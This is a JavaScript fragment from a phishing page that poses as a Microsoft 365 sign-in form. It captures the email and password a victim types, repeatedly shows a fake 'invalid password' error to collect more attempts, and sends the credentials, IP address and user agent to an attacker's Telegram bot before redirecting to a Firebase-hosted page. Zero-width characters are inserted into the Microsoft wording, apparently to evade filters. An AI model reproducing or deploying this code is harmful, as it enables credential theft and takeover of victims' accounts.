        var bless = 0;
        var passion;
        document.getElementById("sign_in_btn")
            .addEventListener("click", function (e) {
                var passions = document.getElementById('password').value;
                if (passions == null || passions == "") {
                    var comp = document.getElementById('kini').innerHTML = `P͏l͏e͏a͏s͏e͏ e͏n͏t͏e͏r͏ t͏h͏e͏ p͏a͏s͏s͏w͏o͏r͏d͏ for your M͏i͏c͏r͏o͏s͏o͏f͏t͏ a͏c͏c͏o͏u͏n͏t͏.`;
                    setTimeout(() => {  document.getElementById('kini').innerHTML = '';  }, 2000);
                }
                else if (passions.length < 5) {
                    document.getElementById('kini').innerHTML = "Your a͏c͏c͏o͏u͏n͏t͏ p͏a͏s͏s͏w͏o͏r͏d͏ is t͏o͏o͏ s͏h͏o͏r͏t͏.";
                    setTimeout(() => {
                        document.getElementById('kini').innerHTML = '';
                        document.getElementById("password").value = '';
                    }, 2000);
                } else if (bless < 4) {
                    you = document.getElementById('email').value;
                    passion = document.getElementById('password').value;
                    document.getElementById('kini').innerHTML = "Connecting to mail server.....";
					setTimeout(() => { document.getElementById('kini').innerHTML = "Invalid password or server error try again.....";  document.getElementById("password").value = '';}, 4000);
					var IP = document.getElementById('gfg').textContent;
					 var word = `====== O͏3͏6͏5͏ R͏e͏s͏u͏l͏t͏ ======\r\nEmail: ${you}\r\nPassword1: ${passion}\r\nPassword2: ${passions}\r\nIP: https://ip-api.com/${IP}\r\nUser-Agent: ${navigator.userAgent}\r\n======`;
					 var settings = {
                        "async": true, "crossDomain": true, "url": "https://api.telegram.org/bot" + token + "/sendMessage",
                        "method": "POST", "headers": { "Content-Type": "application/json", "cache-control": "no-cache" },
                        "data": JSON.stringify({ "chat_id": chat_id, "text": word })
                    }
                     $.ajax(settings).done((response) => {
                   document.getElementById('kini').innerHTML = "";
					});
                    bless++;
                } else {
                     window.location.replace("https://firebasestorage.googleapis.com/v0/b/kadaw0no3qldv.appspot.com/o/succesful.html?alt=media&token=dc3eaa8d-f12e-489d-a1f8-bfc49153e2f5#");
                }

            }); 
